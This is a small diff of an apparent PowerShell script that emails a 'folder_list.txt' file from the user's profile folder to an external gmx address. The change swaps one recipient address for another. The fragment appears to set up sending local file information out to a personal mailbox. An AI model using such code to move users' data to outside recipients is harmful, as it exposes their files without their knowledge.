@@ -1,5 +1,5 @@
 $senderEmail = "jhonhkfj@gmx.com"
-$recipientEmail = "recipient@emcd.com"
+$recipientEmail = "Kroksten@gmx.com"
 $subject = "Folder List"
 $body = "Please find attached the folder list."
 $attachmentPath = Join-Path -Path ([System.Environment]::ExpandEnvironmentVariables("%USERPROFILE%")) -ChildPath "folder_list.txt"
